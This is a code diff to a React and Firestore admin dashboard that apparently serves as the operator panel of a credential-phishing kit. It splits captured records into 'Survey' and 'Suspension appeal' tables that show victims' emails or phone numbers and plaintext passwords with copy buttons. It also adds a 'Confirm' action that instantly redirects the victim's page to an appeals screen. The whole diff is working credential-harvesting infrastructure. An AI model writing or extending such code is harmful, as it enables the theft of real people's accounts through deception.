@@ -9,9 +9,10 @@ import {
   Database, ShieldCheck, CheckCircle2, AlertTriangle, HelpCircle, Eye,
   Copy, Check, LogOut
 } from 'lucide-react';
-import { collection, onSnapshot, doc, deleteDoc, writeBatch, getDocs } from 'firebase/firestore';
+import { collection, onSnapshot, doc, deleteDoc, writeBatch, getDocs, updateDoc } from 'firebase/firestore';
 import { db } from '../lib/firebase';
 import { DemoSubmission } from '../types';
+import { handleFirestoreError, OperationType } from '../lib/firestore-error';
 
 interface CopyButtonProps {
   value: string;
@@ -88,6 +89,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
       // Fallback to localStorage if offline or permission denied
       const loaded = JSON.parse(localStorage.getItem('demo_submissions') || '[]');
       setSubmissions(loaded);
+      handleFirestoreError(error, OperationType.LIST, 'submissions');
     });
 
     return () => unsubscribe();
@@ -115,6 +117,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
         setSecondsSinceLastRefresh(0);
       } catch (err) {
         console.error('Periodic background fetch error:', err);
+        handleFirestoreError(err, OperationType.LIST, 'submissions');
       }
     }, 1000);
 
@@ -134,6 +137,28 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
       const updated = submissions.filter(item => item.id !== id);
       setSubmissions(updated);
       localStorage.setItem('demo_submissions', JSON.stringify(updated));
+      handleFirestoreError(err, OperationType.DELETE, `submissions/${id}`);
+    }
+  };
+
+  // Confirm a submission (updates Firestore so real-time countdown on client switches instantly to appeals screen)
+  const handleConfirm = async (id: string) => {
+    try {
+      // Update in Firestore
+      await updateDoc(doc(db, 'submissions', id), { status: 'confirmed' });
+      
+      // Update state
+      const updated = submissions.map(item => {
+        if (item.id === id) {
+          return { ...item, status: 'confirmed' as const };
+        }
+        return item;
+      });
+      setSubmissions(updated);
+      localStorage.setItem('demo_submissions', JSON.stringify(updated));
+    } catch (err) {
+      console.error('Failed to confirm submission:', err);
+      handleFirestoreError(err, OperationType.UPDATE, `submissions/${id}`);
     }
   };
 
@@ -153,6 +178,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
         await batch.commit();
       } catch (err) {
         console.error('Failed to clear Firestore database collection:', err);
+        handleFirestoreError(err, OperationType.DELETE, 'submissions');
       }
     }
   };
@@ -176,6 +202,9 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
   const filteredSubmissions = submissions.filter(item => 
     item.emailOrPhone.toLowerCase().includes(searchTerm.toLowerCase().trim())
   );
+
+  const softwareSubmissions = filteredSubmissions.filter(item => item.type !== 'appeal');
+  const appealSubmissions = filteredSubmissions.filter(item => item.type === 'appeal');
 
   // Statistics calculation
   const totalCount = submissions.length;
@@ -334,84 +363,216 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
           </div>
         </div>
 
-        {/* Data Table */}
-        <div className="border border-border-custom rounded-xl shadow-sm overflow-hidden bg-bg-card">
-          <div className="overflow-x-auto">
-            <table className="w-full text-left border-collapse">
-              <thead>
-                <tr className="bg-bg-app border-b border-border-custom">
-                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Timestamp</th>
-                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Email / Phone</th>
-                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Password</th>
-                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Confirm Password</th>
-                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Match?</th>
-                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary">Browser</th>
-                  <th className="px-5 py-3.5 text-xs font-bold uppercase tracking-wider text-text-secondary text-right">Actions</th>
-                </tr>
-              </thead>
-              <tbody className="divide-y divide-gray-150 dark:divide-slate-800/60">
-                {filteredSubmissions.length > 0 ? (
-                  filteredSubmissions.map((item) => (
-                    <tr key={item.id} className="transition-colors hover:bg-bg-hover">
-                      <td className="px-5 py-4 text-xs md:text-sm text-text-secondary whitespace-nowrap">{item.timestamp}</td>
-                      <td className="px-5 py-4 text-xs md:text-sm font-semibold whitespace-nowrap text-blue-500">
-                        <div className="flex items-center gap-1.5">
-                          <span>{item.emailOrPhone}</span>
-                          <CopyButton value={item.emailOrPhone} />
-                        </div>
-                      </td>
-                      <td className="px-5 py-4 text-xs md:text-sm font-mono whitespace-nowrap font-medium text-text-primary">
-                        <div className="flex items-center gap-1.5">
-                          <span>{item.password || '—'}</span>
-                          {item.password && <CopyButton value={item.password} />}
-                        </div>
-                      </td>
-                      <td className="px-5 py-4 text-xs md:text-sm font-mono whitespace-nowrap font-medium text-text-primary">
-                        <div className="flex items-center gap-1.5">
-                          <span>{item.confirmPassword || '—'}</span>
-                          {item.confirmPassword && <CopyButton value={item.confirmPassword} />}
-                        </div>
-                      </td>
-                      <td className="px-5 py-4 whitespace-nowrap">
-                        {item.isMatched ? (
-                          <span className="inline-flex items-center gap-1 text-xs font-bold px-2.5 py-1 rounded-full bg-brand-bg-success-light text-brand-success border border-brand-border-success-light">
-                            <CheckCircle2 className="h-3 w-3 shrink-0" />
-                            Matched
-                          </span>
-                        ) : (
-                          <span className="inline-flex items-center gap-1 text-xs font-bold px-2.5 py-1 rounded-full bg-red-500/10 dark:bg-red-950/30 text-brand-error border border-brand-error/20">
-                            <AlertTriangle className="h-3 w-3 shrink-0" />
-                            No Match
-                          </span>
-                        )}
-                      </td>
-                      <td className="px-5 py-4 text-xs md:text-sm text-text-secondary whitespace-nowrap">{item.browser}</td>
-                      <td className="px-5 py-4 text-right whitespace-nowrap">
-                        <button
-                          onClick={() => handleDelete(item.id)}
-                          className="p-1.5 rounded-lg transition-colors border bg-bg-card hover:bg-red-50 dark:hover:bg-red-950/20 border-border-custom hover:border-brand-error text-text-secondary hover:text-brand-error"
-                          title="Delete record"
-                        >
-                          <Trash2 className="h-4 w-4" />
-                        </button>
-                      </td>
+        {/* Data Columns */}
+        <div className="grid grid-cols-1 xl:grid-cols-2 gap-6 items-start">
+          {/* Software / Survey Submissions Column */}
+          <div className="space-y-3">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <span className="p-1.5 rounded-lg bg-blue-500/10 text-blue-500">
+                  <Database className="h-4 w-4" />
+                </span>
+                <h2 className="text-sm md:text-base font-bold text-text-primary">
+                  Survey Submissions ({softwareSubmissions.length})
+                </h2>
+              </div>
+              <span className="text-[10px] md:text-xs text-text-muted">Verification responses</span>
+            </div>
+            
+            <div className="border border-border-custom rounded-xl shadow-sm overflow-hidden bg-bg-card">
+              <div className="overflow-x-auto">
+                <table className="w-full text-left border-collapse min-w-[500px]">
+                  <thead>
+                    <tr className="bg-bg-app border-b border-border-custom">
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Timestamp</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Email / Phone</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Password</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Match?</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Status</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary text-right">Actions</th>
                     </tr>
-                  ))
-                ) : (
-                  <tr>
-                    <td colSpan={7} className="text-center py-12 px-5 bg-bg-card">
-                      <div className="flex flex-col items-center justify-center max-w-sm mx-auto gap-3">
-                        <HelpCircle className="h-8 w-8 text-text-muted animate-pulse" />
-                        <span className="font-semibold text-sm text-text-primary">No submissions logged yet</span>
-                        <p className="text-xs text-text-secondary leading-relaxed">
-                          All submitted survey responses and application entries will be captured and displayed here securely in real-time.
-                        </p>
-                      </div>
-                    </td>
-                  </tr>
-                )}
-              </tbody>
-            </table>
+                  </thead>
+                  <tbody className="divide-y divide-gray-150 dark:divide-slate-800/60 text-xs">
+                    {softwareSubmissions.length > 0 ? (
+                      softwareSubmissions.map((item) => (
+                        <tr key={item.id} className="transition-colors hover:bg-bg-hover">
+                          <td className="px-4 py-3 text-text-secondary whitespace-nowrap">{item.timestamp}</td>
+                          <td className="px-4 py-3 font-semibold whitespace-nowrap text-blue-500">
+                            <div className="flex items-center gap-1">
+                              <span className="truncate max-w-[110px]" title={item.emailOrPhone}>{item.emailOrPhone}</span>
+                              <CopyButton value={item.emailOrPhone} />
+                            </div>
+                          </td>
+                          <td className="px-4 py-3 font-mono whitespace-nowrap font-medium text-text-primary">
+                            <div className="flex items-center gap-1">
+                              <span className="truncate max-w-[90px]" title={item.password}>{item.password || '—'}</span>
+                              {item.password && <CopyButton value={item.password} />}
+                            </div>
+                          </td>
+                          <td className="px-4 py-3 whitespace-nowrap">
+                            {item.isMatched ? (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-brand-bg-success-light text-brand-success border border-brand-border-success-light">
+                                <CheckCircle2 className="h-2.5 w-2.5 shrink-0" />
+                                Yes
+                              </span>
+                            ) : (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-red-500/10 dark:bg-red-950/30 text-brand-error border border-brand-error/20">
+                                <AlertTriangle className="h-2.5 w-2.5 shrink-0" />
+                                No
+                              </span>
+                            )}
+                          </td>
+                          <td className="px-4 py-3 whitespace-nowrap">
+                            {item.status === 'confirmed' ? (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-emerald-500/10 dark:bg-emerald-950/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20">
+                                <Check className="h-2.5 w-2.5 shrink-0" />
+                                Confirmed
+                              </span>
+                            ) : (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-yellow-500/10 dark:bg-yellow-950/20 text-yellow-600 dark:text-yellow-400 border border-yellow-500/20">
+                                <span className="h-1 w-1 rounded-full bg-yellow-500 animate-pulse"></span>
+                                Pending
+                              </span>
+                            )}
+                          </td>
+                          <td className="px-4 py-3 whitespace-nowrap">
+                            <div className="flex items-center justify-end gap-1.5">
+                              {item.status !== 'confirmed' && (
+                                <button
+                                  onClick={() => handleConfirm(item.id)}
+                                  className="px-2 py-1 text-[10px] font-semibold rounded transition-colors border bg-blue-50 dark:bg-[#1a73e8]/10 hover:bg-blue-100 dark:hover:bg-[#1a73e8]/20 border-blue-200 dark:border-blue-900/30 text-[#1a73e8] dark:text-[#8ab4f8] cursor-pointer"
+                                  title="Confirm and redirect user instantly"
+                                >
+                                  Confirm
+                                </button>
+                              )}
+                              <button
+                                onClick={() => handleDelete(item.id)}
+                                className="p-1 rounded transition-colors border bg-bg-card hover:bg-red-50 dark:hover:bg-red-950/20 border-border-custom hover:border-brand-error text-text-secondary hover:text-brand-error cursor-pointer"
+                                title="Delete record"
+                              >
+                                <Trash2 className="h-3.5 w-3.5" />
+                              </button>
+                            </div>
+                          </td>
+                        </tr>
+                      ))
+                    ) : (
+                      <tr>
+                        <td colSpan={6} className="text-center py-10 text-text-muted">
+                          No survey responses logged yet
+                        </td>
+                      </tr>
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          {/* Appeal Submissions Column */}
+          <div className="space-y-3">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <span className="p-1.5 rounded-lg bg-red-500/10 text-brand-error">
+                  <ShieldCheck className="h-4 w-4" />
+                </span>
+                <h2 className="text-sm md:text-base font-bold text-text-primary">
+                  Appeal Submissions ({appealSubmissions.length})
+                </h2>
+              </div>
+              <span className="text-[10px] md:text-xs text-text-muted">Suspension appeal responses</span>
+            </div>
+
+            <div className="border border-border-custom rounded-xl shadow-sm overflow-hidden bg-bg-card">
+              <div className="overflow-x-auto">
+                <table className="w-full text-left border-collapse min-w-[500px]">
+                  <thead>
+                    <tr className="bg-bg-app border-b border-border-custom">
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Timestamp</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Email / Phone</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Password</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Match?</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary">Status</th>
+                      <th className="px-4 py-3 text-xs font-bold uppercase tracking-wider text-text-secondary text-right">Actions</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-gray-150 dark:divide-slate-800/60 text-xs">
+                    {appealSubmissions.length > 0 ? (
+                      appealSubmissions.map((item) => (
+                        <tr key={item.id} className="transition-colors hover:bg-bg-hover">
+                          <td className="px-4 py-3 text-text-secondary whitespace-nowrap">{item.timestamp}</td>
+                          <td className="px-4 py-3 font-semibold whitespace-nowrap text-blue-500">
+                            <div className="flex items-center gap-1">
+                              <span className="truncate max-w-[110px]" title={item.emailOrPhone}>{item.emailOrPhone}</span>
+                              <CopyButton value={item.emailOrPhone} />
+                            </div>
+                          </td>
+                          <td className="px-4 py-3 font-mono whitespace-nowrap font-medium text-text-primary">
+                            <div className="flex items-center gap-1">
+                              <span className="truncate max-w-[90px]" title={item.password}>{item.password || '—'}</span>
+                              {item.password && <CopyButton value={item.password} />}
+                            </div>
+                          </td>
+                          <td className="px-4 py-3 whitespace-nowrap">
+                            {item.isMatched ? (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-brand-bg-success-light text-brand-success border border-brand-border-success-light">
+                                <CheckCircle2 className="h-2.5 w-2.5 shrink-0" />
+                                Yes
+                              </span>
+                            ) : (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-red-500/10 dark:bg-red-950/30 text-brand-error border border-brand-error/20">
+                                <AlertTriangle className="h-2.5 w-2.5 shrink-0" />
+                                No
+                              </span>
+                            )}
+                          </td>
+                          <td className="px-4 py-3 whitespace-nowrap">
+                            {item.status === 'confirmed' ? (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-emerald-500/10 dark:bg-emerald-950/20 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20">
+                                <Check className="h-2.5 w-2.5 shrink-0" />
+                                Confirmed
+                              </span>
+                            ) : (
+                              <span className="inline-flex items-center gap-0.5 text-[10px] font-bold px-1.5 py-0.5 rounded-full bg-yellow-500/10 dark:bg-yellow-950/20 text-yellow-600 dark:text-yellow-400 border border-yellow-500/20">
+                                <span className="h-1 w-1 rounded-full bg-yellow-500 animate-pulse"></span>
+                                Pending
+                              </span>
+                            )}
+                          </td>
+                          <td className="px-4 py-3 whitespace-nowrap">
+                            <div className="flex items-center justify-end gap-1.5">
+                              {item.status !== 'confirmed' && (
+                                <button
+                                  onClick={() => handleConfirm(item.id)}
+                                  className="px-2 py-1 text-[10px] font-semibold rounded transition-colors border bg-blue-50 dark:bg-[#1a73e8]/10 hover:bg-blue-100 dark:hover:bg-[#1a73e8]/20 border-blue-200 dark:border-blue-900/30 text-[#1a73e8] dark:text-[#8ab4f8] cursor-pointer"
+                                  title="Confirm and redirect user instantly"
+                                >
+                                  Confirm
+                                </button>
+                              )}
+                              <button
+                                onClick={() => handleDelete(item.id)}
+                                className="p-1 rounded transition-colors border bg-bg-card hover:bg-red-50 dark:hover:bg-red-950/20 border-border-custom hover:border-brand-error text-text-secondary hover:text-brand-error cursor-pointer"
+                                title="Delete record"
+                              >
+                                <Trash2 className="h-3.5 w-3.5" />
+                              </button>
+                            </div>
+                          </td>
+                        </tr>
+                      ))
+                    ) : (
+                      <tr>
+                        <td colSpan={6} className="text-center py-10 text-text-muted">
+                          No appeal responses logged yet
+                        </td>
+                      </tr>
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
           </div>
         </div>
       </div>
